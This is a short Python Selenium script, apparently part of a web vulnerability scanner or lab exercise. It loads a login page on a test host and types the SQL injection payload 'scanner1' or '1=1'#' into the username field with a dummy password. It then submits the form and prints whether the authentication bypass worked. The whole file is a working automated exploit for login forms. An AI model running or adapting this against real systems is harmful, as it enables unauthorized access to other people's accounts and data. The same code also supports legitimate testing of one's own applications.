from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import httplib as http, urllib as url

driver = webdriver.Firefox()
driver.get("http://app1.com/users/login.php")
loginURL="http://app1.com/users/login.php"
if (len(driver.find_elements_by_name("username")) > 0):
	nameele = driver.find_element_by_name("username")
elif (len(driver.find_elements_by_id("username")) > 0):
	nameele = driver.find_element_by_id("username")
nameele.send_keys("scanner1' or '1=1'#")

if (len(driver.find_elements_by_name("password")) > 0):
	passele = driver.find_element_by_name("password")
elif (len(driver.find_elements_by_id("password")) > 0):
	passele = driver.find_element_by_id("password")
passele.send_keys("dummy")

inp_elems = driver.find_elements_by_tag_name('input')
for i in inp_elems:
		if (((i.get_attribute('type') == 'button') or (i.get_attribute('type') == 'submit')) &
		((i.get_attribute('value') == 'Login') or (i.get_attribute('value') == 'login'))):
			i.click()
			url2= driver.current_url
			if(url2 == loginURL):
				print "login attempt failed"
			else:
				driver.get(url2)
				print "login successful"
				break

